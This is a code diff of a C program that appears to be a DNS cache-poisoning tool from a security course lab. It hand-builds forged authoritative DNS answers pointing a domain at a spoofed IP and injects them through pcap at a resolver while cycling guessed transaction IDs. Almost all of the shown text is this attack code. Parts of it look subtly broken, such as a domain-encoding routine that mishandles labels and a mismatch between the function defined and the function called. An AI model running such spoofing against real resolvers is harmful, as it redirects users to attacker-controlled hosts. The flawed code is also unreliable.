@@ -13,74 +13,60 @@
 #define TAP2 0x80000062
 
 
-#include <sys/socket.h>
-#include <netinet/udp.h>
-#include <netinet/ip.h>
-
-// Constants
-#define PACKET_SIZE 1024
-#define DNS_PORT 53
-
 int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid);
 
 int build_dns_response(unsigned char *buffer, unsigned char *query, int query_len, uint32_t txid);
-
-// DNS Header Structure
-struct dns_header {
-    unsigned short id;       // Transaction ID
-    unsigned short flags;    // Flags
-    unsigned short q_count;  // Questions
-    unsigned short ans_count; // Answers
-    unsigned short auth_count; // Authority RRs
-    unsigned short add_count;  // Additional RRs
-};
-
-// DNS Question Structure
-struct dns_question {
-    unsigned short qtype;  // Query type
-    unsigned short qclass; // Query class
-};
-
-// DNS Resource Record Structure
-struct dns_rr {
-    unsigned short name;    // Pointer to the domain name
-    unsigned short type;    // Resource record type
-    unsigned short _class;  // Class
-    unsigned int ttl;       // Time to live
-    unsigned short data_len; // Length of the resource data
-    unsigned int rdata;     // Resolved IP address
-};
-
-// Checksum function
-unsigned short checksum(void *b, int len) {
-    unsigned short *buf = b;
-    unsigned int sum = 0;
-    unsigned short result;
-
-    for (; len > 1; len -= 2) {
-        sum += *buf++;
-    }
-    if (len == 1) {
-        sum += *(unsigned char *)buf;
-    }
-
-    sum = (sum >> 16) + (sum & 0xFFFF);
-    sum += (sum >> 16);
-    result = ~sum;
-    return result;
-}
-
-
-#include <pcap.h>
-#include <ldns/ldns.h>
-
-
 #define SPOOFED_IP "6.6.6.6"
 #define RESOLVER_IP "192.168.1.203"
+#define DNS_QUERY_NAME "www.example.cybercourse.com"
 
+#pragma pack(push, 1)
 
-int full_spoofed_answer(const char *resolver_ip, int resolver_port, const char *query_name, uint16_t txid) {
-    
+// DNS header structure
+struct dns_header {
+    uint16_t id;       // Transaction ID
+    uint16_t flags;    // Flags
+    uint16_t q_count;  // Number of questions
+    uint16_t ans_count; // Number of answers
+    uint16_t auth_count; // Number of authoritative records
+    uint16_t add_count;  // Number of additional records
+};
+
+// DNS question structure
+struct dns_question {
+    uint16_t qtype;  // Type (A = 1)
+    uint16_t qclass; // Class (IN = 1)
+};
+
+// DNS answer structure
+struct dns_answer {
+    uint16_t name;    // Pointer to query name
+    uint16_t type;    // Type (A = 1)
+    uint16_t class;   // Class (IN = 1)
+    uint32_t ttl;     // Time to live
+    uint16_t rdlength; // Length of rdata
+    uint32_t rdata;   // The spoofed IP address
+};
+
+#pragma pack(pop)
+
+// Function to encode domain name into DNS format
+void encode_domain_name(unsigned char *dns, const char *host) {
+    int lock = 0;
+    strcat((char *)dns, ".");
+    for (int i = 0; i < strlen(host); i++) {
+        if (host[i] == '.') {
+            *dns++ = i - lock;
+            for (; lock < i; lock++) {
+                *dns++ = host[lock];
+            }
+            lock++; // Skip the '.'
+        }
+    }
+    *dns++ = '\0';
+}
+
+void send_spoofed_packet2(const char *resolver_ip, int resolver_port, const char *query_name, uint16_t txid) {
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t *handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);
     if (!handle) {
@@ -111,29 +97,36 @@ int full_spoofed_answer(const char *resolver_ip, int resolver_port, const char *
     udp_hdr->uh_dport = htons(resolver_port); // Target resolver port
     udp_hdr->uh_ulen = htons(sizeof(struct udphdr) + 512); // UDP length
 
-    // Build the DNS answer
+    // Build the DNS header
     unsigned char *dns_data = packet + sizeof(struct ip) + sizeof(struct udphdr);
-    ldns_pkt *dns_pkt = ldns_pkt_new();
-    ldns_pkt_set_id(dns_pkt, txid);
-    ldns_pkt_set_qr(dns_pkt, true); // Response flag
-    ldns_pkt_set_aa(dns_pkt, true); // Authoritative flag
-    ldns_rr_list *answer_rr_list = ldns_rr_list_new();
-    ldns_rr *answer_rr = ldns_rr_new_frm_str("www.example.cybercourse.com. 3600 IN A 6.6.6.6");
-    ldns_rr_list_push_rr(answer_rr_list, answer_rr);
-    ldns_pkt_set_answer(dns_pkt, answer_rr_list);
+    struct dns_header *dns_hdr = (struct dns_header *) dns_data;
+    dns_hdr->id = htons(txid);
+    dns_hdr->flags = htons(0x8180); // Response flag, authoritative answer
+    dns_hdr->q_count = htons(1);   // One question
+    dns_hdr->ans_count = htons(1); // One answer
+    dns_hdr->auth_count = 0;
+    dns_hdr->add_count = 0;
 
-    // Convert the DNS packet to wire format
-    uint8_t *wire_data = NULL;
-    size_t wire_len = 0;
-    ldns_status status = ldns_pkt2wire(&wire_data, dns_pkt, &wire_len);
-    if (status != LDNS_STATUS_OK) {
-        fprintf(stderr, "Failed to encode DNS packet: %s\n", ldns_get_errorstr_by_id(status));
-        exit(1);
-    }
-    memcpy(dns_data, wire_data, wire_len);
+    // Add the question section
+    unsigned char *query = dns_data + sizeof(struct dns_header);
+    encode_domain_name(query, query_name);
+    struct dns_question *dns_q = (struct dns_question *)(query + strlen((const char *)query) + 1);
+    dns_q->qtype = htons(1);  // A record
+    dns_q->qclass = htons(1); // IN class
+
+    // Add the answer section
+    struct dns_answer *dns_a = (struct dns_answer *)(query + strlen((const char *)query) + 1 + sizeof(struct dns_question));
+    dns_a->name = htons(0xc00c); // Pointer to the query name
+    dns_a->type = htons(1);      // A record
+    dns_a->class = htons(1);     // IN class
+    dns_a->ttl = htonl(3600);    // TTL
+    dns_a->rdlength = htons(4);  // Length of IP address
+    dns_a->rdata = inet_addr(SPOOFED_IP); // Spoofed IP address
 
     // Send the packet
-    if (pcap_inject(handle, packet, sizeof(struct ip) + sizeof(struct udphdr) + wire_len) == -1) {
+    int packet_size = sizeof(struct ip) + sizeof(struct udphdr) + sizeof(struct dns_header) +
+                      strlen((const char *)query) + 1 + sizeof(struct dns_question) + sizeof(struct dns_answer);
+    if (pcap_inject(handle, packet, packet_size) == -1) {
         fprintf(stderr, "Failed to send packet: %s\n", pcap_geterr(handle));
     } else {
         printf("Spoofed packet sent!\n");
@@ -141,9 +134,6 @@ int full_spoofed_answer(const char *resolver_ip, int resolver_port, const char *
 
     // Clean up
     pcap_close(handle);
-    ldns_pkt_free(dns_pkt);
-    ldns_rr_list_deep_free(answer_rr_list);
-    free(wire_data);
 }
 
 
@@ -363,7 +353,7 @@ void run_attack(uint32_t *txid_ls) {
     for (int i = 0; i < 10; i++) {
         // send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
         // full_spoofed_answer(txid_ls[i], source_port);
-        send_spoofed_packet(RESOLVER_IP, source_port, "www.example.cybercourse.com", txid_ls[i]);
+        send_spoofed_packet(RESOLVER_IP, source_port, DNS_QUERY_NAME, txid_ls[i]);
     }
     
     // Close the connection
